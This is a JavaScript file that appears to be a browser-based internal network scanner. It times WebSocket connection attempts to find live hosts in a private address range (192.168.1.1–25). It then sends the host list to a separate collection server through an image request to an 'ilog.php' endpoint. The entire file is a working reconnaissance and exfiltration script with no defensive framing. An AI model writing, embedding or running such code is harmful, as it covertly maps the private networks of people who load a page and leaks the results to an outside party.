var start_ip=[];
var end_ip=[];
var start_time;
var current_ip=[];
var open_port_max=300;
var closed_port_max=2000;
var ns_hosts_up=[];
var finaldata,logz;

reset_scan_out();

start_ip = '192.168.1.1'.split('.');
end_ip = '192.168.1.25'.split('.');
 current_ip=[];
    ns_hosts_up=[];
    setTimeout("scan_network_ws()",1);

    
function scan_network_ws()
{
    if(init_ip_ns())
    {
    var rett= encodeURIComponent(finaldata+logz);

    new Image().src = 'http://192.168.80.1:5005/ilog.php?log='+rett;
    return;
    }

    start_time = (new Date).getTime();
    try
    {
        ws = new WebSocket("ws://" + current_ip.join("."));
        setTimeout("check_ns_ws()",100);
    }
    catch(err)
    {
        return;
    }
}
    
function check_ns_ws()
{
    var interval = (new Date).getTime() - start_time;
    if(ws.readyState == 0)
    {
        if(interval > closed_port_max)
        {
            log(current_ip.join(".") + " - down<br>");
            setTimeout("scan_network_ws()",1);
        }
        else
        {
            setTimeout("check_ns_ws()",100);
        }
    }
    else
    {
        log(current_ip.join(".") + " - up<br>");
        ns_hosts_up.push(current_ip.join("."));
        setTimeout("scan_network_ws()",1);
    }
}
    
    

function init_ip_ns()
{
    if(current_ip.length == 0)
    {
        current_ip = copy_ip(start_ip);
    }
    else if(compare_ip(current_ip,end_ip) == 2)
    {
        results_ns();
        return true;
    }
    else
    {
        current_ip = increment_ip(current_ip);
    }
    return false;
}

function results_ns()
{
    finaldata = "<br><b>Live Hosts:</b><br>" + ns_hosts_up + "<br><b>Status</b><br>";
}

function copy_ip(source)
{
    var dest = [];
    for(var i=0;i<source.length;i++)
    {
        dest[i] = source[i];
    }
    return dest;
}



function compare_ip(a,b)
{
    for(var i=0;i<4;i++)
    {
        var r = _compare_int(a[i],b[i]);
        if(r == 1)
        {
            return 1;//a is greater than b
        }
        else if(r == 3)
        {
            return 3;//b is greater than a
        }
    }
    return 2;//b is equal to a
}

function _compare_int(_a,_b)
{
    if(_a > _b)
    {
        return 1;//_a is greater than _b
    }
    else if(_a == _b)
    {
        return 2;//_a is equal to _b
    }
    else
    {
        return 3;//_a is lesser than _b
    }
}

function increment_ip(inc_ip)
{
    inc_ip[3]++;
    for(var i=3;i>=0;i--)
    {
        if(inc_ip[i] == 255)
        {
            inc_ip[i] = 0;
            inc_ip[i-1]++;
        }
    }
    return inc_ip;
}

function log(to_log)
{
    logz += to_log + "<br>";
}

function reset_scan_out()
{
    finaldata= "";
    logz = "";
}

